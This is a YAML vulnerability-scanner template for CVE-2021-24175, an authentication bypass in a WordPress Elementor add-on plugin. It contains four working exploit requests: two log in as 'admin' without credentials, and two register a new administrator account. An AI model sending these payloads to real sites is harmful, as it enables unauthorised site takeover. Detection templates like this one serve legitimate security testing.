id: CVE-2021-24175

info:
  name: The Plus Addons for Elementor Page Builder Authentication Bypass
  author: ProjectDiscoveryAI
  severity: critical
  description: The Plus Addons for Elementor Page Builder WordPress plugin before 4.1.7 was being actively exploited to by malicious actors to bypass authentication, allowing unauthenticated users to log in as any user (including admin) by just providing the related username, as well as create accounts with arbitrary roles, such as admin.
  impact: |
    Successful exploitation could allow an attacker to bypass authentication controls.
  remediation: |
    Apply the vendor-supplied patch or update to the latest version to mitigate the vulnerability.
  reference:
    - https://posimyth.ticksy.com/ticket/2713734/
    - https://www.wordfence.com/blog/2021/03/critical-0-day-in-the-plus-addons-for-elementor-allows-site-takeover/
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/EdgeSecurityTeam/Vulnerability
    - https://github.com/J1ezds/Vulnerability-Wiki-page
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-24175
    cwe-id: CWE-287
    epss-score: 0.00905
    epss-percentile: 0.83383
    cpe: cpe:2.3:a:posimyth:the_plus_addons_for_elementor:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: posimyth
    product: the_plus_addons_for_elementor
    framework: wordpress

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    body: |
      action=theplus_ajax_login&email=admin
    matchers:
      - type: word
        words:
          - "administrator"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    body: |
      action=theplus_google_ajax_register&email=admin&nonce=a
    matchers:
      - type: word
        words:
          - "administrator"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    body: |
      name=newadmin&email=test@example.com&password=test&action=theplus_google_ajax_register&tp_user_reg_role=administrator&nonce=any
    matchers:
      - type: word
        words:
          - "administrator"
        part: body

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    body: |
      name=newadmin&email=test@example.com&password=test&action=theplus_ajax_register&tp_user_reg_role=administrator&nonce=any
    matchers:
      - type: word
        words:
          - "administrator"
        part: body
